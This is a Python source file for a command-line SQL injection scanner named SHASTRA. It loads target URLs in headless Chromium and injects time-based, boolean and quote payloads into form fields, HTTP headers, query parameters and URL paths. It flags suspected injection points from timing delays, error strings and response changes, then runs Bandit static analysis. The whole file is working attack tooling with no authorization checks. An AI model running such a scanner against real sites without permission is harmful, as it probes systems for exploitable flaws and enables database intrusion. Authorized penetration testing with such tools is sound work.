import argparse, asyncio, json, subprocess, pyfiglet
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
import tldextract
from playwright.async_api import async_playwright
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.text import Text
import time
import sys

def print_banner():
    console = Console()
    ascii_art = pyfiglet.figlet_format("SHASTRA", font="slant")
    console.print(f"[bold cyan]{ascii_art}[/bold cyan]")
    console.print("[italic green]Playwright-powered SQLi & Static Analyzer[/italic green]")
    console.print("[bold yellow]by mrgreyhat07[/bold yellow]\n")

SQL_PAYLOADS = [
    "'", "''", "--", "-- OR 1=1", "--1=1",
    "'+OR+SLEEP(5)--",  # MySQL/PostgreSQL time-based payload
    "'+WAITFOR+DELAY+'0:0:5'--", # MSSQL time-based payload
    "'+OR+(SELECT+DBMS_PIPE.RECEIVE_MESSAGE('a',5)+FROM+DUAL)--", # Oracle time-based payload
    "AND 1=1", # Boolean-based
    "AND 1=2"  # Boolean-based
]
ERROR_SIGNS = ["sql syntax", "mysql", "ora-", "syntax error", "unclosed quotation", "SQLSTATE"]

console = Console()

def domain_key(url):
    e = tldextract.extract(url)
    return f"{e.subdomain}.{e.domain}.{e.suffix}"

def detect_diff(base, test, delay_threshold=4):
    diffs = []
    if abs(test["length"] - base["length"]) > 50:
        diffs.append("length change")
    if any(sig in test["body"].lower() for sig in ERROR_SIGNS):
        diffs.append("error signature")
    if test["headers"] != base["headers"]:
        diffs.append("header change")

    # Re-adding time-based detection to 'diffs' for the Indicators column
    if "response_time" in base and "response_time" in test:
        time_difference = test["response_time"] - base["response_time"]
        if time_difference >= delay_threshold:
            diffs.append(f"time delay ({time_difference:.2f}s)")

    return diffs

def print_http_block(kind, content):
    console.print(f"\n[bold magenta][INF] Dumped HTTP {kind}[/bold magenta]\n")
    console.print(content.strip() or "[empty]")
    console.print()

def format_request(method, url, headers, body=""):
    parsed = urlparse(url)
    lines = [
        f"{method.upper()} {parsed.path or '/'}{'?' + parsed.query if parsed.query else ''} HTTP/1.1",
        f"Host: {parsed.netloc}"
    ] + [f"{k}: {v}" for k, v in headers.items()]
    return "\n".join(lines) + ("\n\n" + body if body else "")

def format_response(status, headers, body=""):
    lines = [f"HTTP/1.1 {status}"] + [f"{k}: {v}" for k, v in headers.items()]
    return "\n".join(lines) + ("\n\n" + body if body else "")

async def fetch_raw(ctx, method, url, payload=None, headers=None, debug=False):
    start_time = time.monotonic()
    try:
        if method == "POST":
            resp = await ctx.post(url, data=payload, timeout=15000)
        else:
            resp = await ctx.get(url, params=payload, timeout=15000)

        text = await resp.text()
        end_time = time.monotonic()
        response_time = end_time - start_time

        if debug:
            body_data = urlencode(payload or {})
            req = format_request(method, url, headers or {}, body_data)
            res = format_response(resp.status, resp.headers, text)
            print_http_block("request", req)
            print_http_block("response", res)
            console.print(f"[bold blue]Response Time: {response_time:.2f} seconds[/bold blue]")
        return {"status": resp.status, "headers": resp.headers, "body": text, "length": len(text), "response_time": response_time}
    except Exception as e:
        end_time = time.monotonic()
        response_time = end_time - start_time
        if debug:
            console.print(f"[red][ERROR] {method} {url}: {e} (Took {response_time:.2f}s)[/red]")
        return None

async def test_forms(page, url, base, out, headers, debug=False, delay_threshold=4):
    req_ctx = page.context.request
    html = await page.content()
    soup = BeautifulSoup(html, "html.parser")

    for form in soup.find_all("form"):
        action = urljoin(url, form.get("action") or "")
        method = form.get("method", "get").lower()
        inputs = {
            inp.get("name"): inp.get("value", "") or "test"
            for inp in form.find_all("input") if inp.get("name")
        }
        for payload in SQL_PAYLOADS:
            data = {k: f"{v}{payload}" for k, v in inputs.items()}
            test = await fetch_raw(req_ctx, method.upper(), action, data, headers, debug)
            if test:
                diffs = detect_diff(base, test, delay_threshold)
                time_diff_val = test["response_time"] - base["response_time"] if "response_time" in base and "response_time" in test else 0

                # Check if there are any differences or if debug is on or if time_diff exceeds threshold
                if diffs or debug or (time_diff_val >= delay_threshold):
                    out.append((action, f"form ({method})", payload, diffs, f"{test['response_time']:.2f}s", f"{time_diff_val:.2f}s"))

async def analyze_url(pw, url, seen, headers_list, delay, debug, delay_threshold=4):
    results = []
    browser = None
    ctx = None
    page = None

    try:
        browser = await pw.chromium.launch(headless=True)
        ctx = await browser.new_context()
        page = await ctx.new_page()
        req_ctx = ctx.request

        base = await fetch_raw(req_ctx, "GET", url, headers={}, debug=debug)
        if base:
            await page.goto(url)
            await test_forms(page, url, base, results, {}, debug, delay_threshold)

        dom = domain_key(url)
        if base and dom not in seen:
            seen.add(dom)
            for hdr in headers_list:
                for payload in SQL_PAYLOADS:
                    header_ctx = None
                    header_page = None
                    try:
                        header_ctx = await browser.new_context(extra_http_headers={hdr: payload})
                        test = await fetch_raw(header_ctx.request, "GET", url, headers={hdr: payload}, debug=debug)
                        if test:
                            diffs = detect_diff(base, test, delay_threshold)
                            time_diff_val = test["response_time"] - base["response_time"] if "response_time" in base and "response_time" in test else 0
                            if diffs or debug or (time_diff_val >= delay_threshold):
                                results.append((url, f"header {hdr}", payload, diffs, f"{test['response_time']:.2f}s", f"{time_diff_val:.2f}s"))
                                header_page = await header_ctx.new_page()
                                await header_page.goto(url)
                                await test_forms(header_page, url, base, results, {hdr: payload}, debug, delay_threshold)
                    finally:
                        if header_page: await header_page.close()
                        if header_ctx: await header_ctx.close()

        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if base:
            if qs:
                for param in qs:
                    for payload in SQL_PAYLOADS:
                        newqs = qs.copy()
                        newqs[param] = [payload]
                        test_url = urlunparse(parsed._replace(query=urlencode(newqs, doseq=True)))
                        test = await fetch_raw(req_ctx, "GET", test_url, headers={}, debug=debug)
                        if test:
                            diffs = detect_diff(base, test, delay_threshold)
                            time_diff_val = test["response_time"] - base["response_time"] if "response_time" in base and "response_time" in test else 0
                            if diffs or debug or (time_diff_val >= delay_threshold):
                                results.append((test_url, f"param {param}", payload, diffs, f"{test['response_time']:.2f}s", f"{time_diff_val:.2f}s"))
            else:
                for payload in SQL_PAYLOADS:
                    test_url = urlunparse(parsed._replace(path=parsed.path + payload))
                    test = await fetch_raw(req_ctx, "GET", test_url, headers={}, debug=debug)
                    if test:
                        diffs = detect_diff(base, test, delay_threshold)
                        time_diff_val = test["response_time"] - base["response_time"] if "response_time" in base and "response_time" in test else 0
                        if diffs or debug or (time_diff_val >= delay_threshold):
                            results.append((test_url, "path injection", payload, diffs, f"{test['response_time']:.2f}s", f"{time_diff_val:.2f}s"))

    except Exception as e:
        console.print(f"[red][ERROR] An unexpected error occurred during URL analysis for {url}: {e}[/red]")
    finally:
        if page: await page.close()
        if ctx: await ctx.close()
        if browser: await browser.close()

    await asyncio.sleep(delay)
    return url, results

async def run_dynamic(urls, threads, delay, headers_list, debug, time_threshold):
    semaphore = asyncio.Semaphore(threads)
    seen = set()

    async with async_playwright() as pw:
        async def worker(url):
            async with semaphore:
                u, res = await analyze_url(pw, url, seen, headers_list, delay, debug, time_threshold)
                display_results(u, res)
                return u, res

        tasks = [asyncio.create_task(worker(u)) for u in urls]
        completed_results = await asyncio.gather(*tasks, return_exceptions=True)

        successful_results = [(u, r) for u, r in completed_results if not isinstance(r, Exception)]
        return successful_results

def display_results(url, results):
    if not results:
        return
    console.rule(f"[bold green]Results for {url}")
    # Updated column names to match the new tuple structure
    tbl = Table("Location", "Payload Type", "Payload", "Indicators", "Response Time", "Time Diff (sec)")
    for loc, typ, payload, diffs, resp_time, time_diff in results:
        tbl.add_row(loc, typ, payload, "; ".join(diffs) or "-", resp_time, time_diff)
    console.print(tbl)

def run_bandit():
    proc = subprocess.run(
        ["bandit", "-r", ".", "-c", "bandit.yaml", "-f", "json"],
        capture_output=True, text=True
    )
    if proc.returncode == 0 and proc.stdout:
        try:
            return json.loads(proc.stdout).get("results", [])
        except json.JSONDecodeError:
            console.print("[red][ERROR] Failed to decode Bandit JSON output.[/red]")
            return []
    elif proc.stderr:
        console.print(f"[red][ERROR] Bandit error: {proc.stderr.strip()}[/red]")
    return []

def cli():
    p = argparse.ArgumentParser(description="SHASTRA: Playwright-powered SQLi & Static Analyzer")
    grp = p.add_mutually_exclusive_group(required=True)
    grp.add_argument("-u", "--url", help="Single URL to scan")
    grp.add_argument("-l", "--list", help="Path to a file containing a list of URLs")
    p.add_argument("-H", "--header", action="append", help="Additional header to fuzz (e.g., 'X-Forwarded-For')")
    p.add_argument("--threads", type=int, default=2, help="Number of concurrent threads (default: 2)")
    p.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1.0s)")
    p.add_argument("--debug", action="store_true", help="Show raw HTTP request/response for debugging")
    p.add_argument("-o", "--output", help="Output file path for JSON results")
    p.add_argument("--time-threshold", type=float, default=4.0,
                   help="Time difference threshold in seconds for blind SQLi detection (default: 4.0s)")
    return p.parse_args()

# Make main an async function
async def main_async():
    args = cli()
    print_banner()

    headers = args.header or ["User-Agent"]
    urls = []
    if args.url:
        urls.append(args.url)
    elif args.list:
        try:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            console.print(f"[bold red]Error: List file '{args.list}' not found.[/bold red]")
            sys.exit(1)

    if not urls:
        console.print("[bold red]No URLs provided to scan. Exiting.[/bold red]")
        sys.exit(1)

    dynamic_results = []
    try:
        dynamic_results = await run_dynamic(urls, args.threads, args.delay, headers, args.debug, args.time_threshold)

    except KeyboardInterrupt:
        console.print("[bold red]Interrupted. Exiting cleanly.[/bold red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[bold red]An unhandled error occurred during dynamic analysis: {e}[/bold red]")
        sys.exit(1)

    band = run_bandit()
    if band:
        console.rule("[bold yellow]Static Analysis Results")
        tbl = Table("File", "Line", "Issue", "Code")
        for issue in band:
            if issue.get("test_id") == "B608": # Focusing on SQL Injection related issues
                loc = f"{issue['filename']}:{issue['line_number']}"
                tbl.add_row(loc, str(issue["line_number"]), issue["issue_text"], issue.get("code", "").strip())
        console.print(tbl)

    if args.output:
        # Ensure dynamic_results is a list of (url, results_for_url) tuples
        formatted_dynamic_results = []
        for url_item, results_list in dynamic_results:
            # results_list contains tuples (loc, typ, payload, diffs, resp_time, time_diff)
            # We want to store a dictionary for each result item
            formatted_url_results = []
            for loc, typ, payload, diffs, resp_time, time_diff in results_list:
                formatted_url_results.append({
                    "location": loc,
                    "payload_type": typ,
                    "payload": payload,
                    "indicators": diffs,
                    "response_time": resp_time,
                    "time_difference": time_diff
                })
            formatted_dynamic_results.append({url_item: formatted_url_results})

        with open(args.output, "w") as f:
            json.dump({"dynamic": formatted_dynamic_results, "static": band}, f, indent=2)

    console.print("[bold green]Scan complete. Exiting.[/bold green]")
    sys.exit(0)

if __name__ == "__main__":
    # Run the async main function
    asyncio.run(main_async())
